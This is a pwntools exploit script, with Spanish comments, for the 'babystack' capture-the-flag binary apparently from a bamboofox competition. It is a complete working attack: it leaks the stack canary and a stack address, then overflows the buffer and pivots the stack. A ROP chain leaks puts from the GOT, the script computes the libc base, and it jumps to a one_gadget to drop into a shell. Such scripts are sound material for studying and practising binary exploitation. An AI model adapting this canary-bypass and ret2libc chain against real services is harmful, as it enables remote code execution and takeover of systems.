#!/usr/bin/env python
from pwn import *
# context.terminal = ["tmux", "splitw", "-h"]
#p = process("/media/sf_UBUNTU-18/PWNING/bamboofox/babystackbabystack")
binf = ELF("./babystack")
libc=ELF("./libc-2.29.so")

#libc = ELF("libc-2.29.so")
#p = remote("chall.ctf.bamboofox.tw", 10102)
p=process('babystack')

gs = '''

break *0x401182

define hook-echo
echo <<<---
end

define hookpost-echo
echo --->>>\n
end

define hook-stop
echo "STACK"
x/120gx $rbp-0x120
echo "STACK"
stack 0x0d
echo "REGISTERS"
i r
end
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)


context.log_level = "DEBUG"


p=start()
#pause()

p.sendafter("Name: \n", "A"*1)
#p.sendafter("Hello, please give me your token: \n", "B"*0x10)
p.sendafter("Hello, please give me your token: \n", "deadbeef")
info("NOMBRE Y TOKEN ENVIADO")
pause()

# primer payload
payload = "A"*9
p.sendafter("str1: \n", payload)
info("STR1 ENVIADO")
pause()

p.recvuntil("A"*9)
canary = u64("\x00" + p.recv(7))
stack = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
success('LEAK STACK OBTENIDO')
success(hex(stack))
success('LEAK CANARY OBTENIDO')
success(hex(canary))
pause()

p.sendafter("str2: \n", "A"*(0x8))
success('Se han enviado 8 As a str2')
pause()

# leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
# success("HEX LEAK ")
# success(hex(leak))

payload = "\x00"+"A"*(0x10-1)
p.sendafter("str1: \n", payload)
success('AS Y NULL BYTE ENVIADO')
pause()

payload = p32(0x40)
payload += p32(0xffffff00)
payload += p64(0)*4
payload += p64(canary)
payload += p64(stack+0x30+0x28)   #sfp 0xdb08
p.sendafter("str2: \n", payload)
success('CANARY PARA OVERFLOW USADO')
print(bytes(payload))
pause()

#obtener leak de libc
sleep(1)
payload = p64(0x0401169)#pop rbp ret
payload += p64(stack-0x30+0x48)
payload += p64(0x00000000004011E5)#creo que aqui es para regresar al main
p.send(payload)#para str1
success('PRIMER PAYLOAD PARA STR1 ENVIADO')
print(bytes(payload))
pause()


sleep(1)
payload = p64(0x004014bb)#pop r15 ret
payload += p64(binf.got['puts'])
payload += p64(binf.plt['puts'])
payload += p64(0x004014bb)#
payload += p64(binf.got['puts'])
payload += p64(binf.plt['strlen'])
payload += p64(0x004014bb)
payload += p64(0)
#.text:00000000004011F9 add     rcx, rdx
#.text:00000000004011FC mov     rdx, rax        ; nbytes
#.text:00000000004011FF mov     rsi, rcx        ; buf
#.text:0000000000401202 mov     edi, 0          ; fd
#.text:0000000000401207 call   
payload += p64(0x004014b9)
payload += p64(stack+0x18)
payload += p64(1)
payload += p64(binf.plt['read'])
p.send(payload)#para str2
sleep(0.1)
success('PRIMER PAYLOAD PARA STR2 ENVIADO')
print(bytes(payload))
pause()

leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
base = leak-libc.symbols['puts']
one = base + 0x106ef8 # este gadget si me sale con one gadget
success('LEAK PARA ONE GADGET OBTENIDO')
success("HEX LEAK ")
success(hex(leak))
success("BASE ")
success(hex(base))
success("ONE 0")
success(hex(one))
pause()


#enviar gadget
payload = "A"*0x60
payload += p64(one)
payload += p64(0)*0x20
p.send(payload)
success('PAYLOAD FINAL ENVIADO')
print(bytes(payload))
pause()

p.interactive()
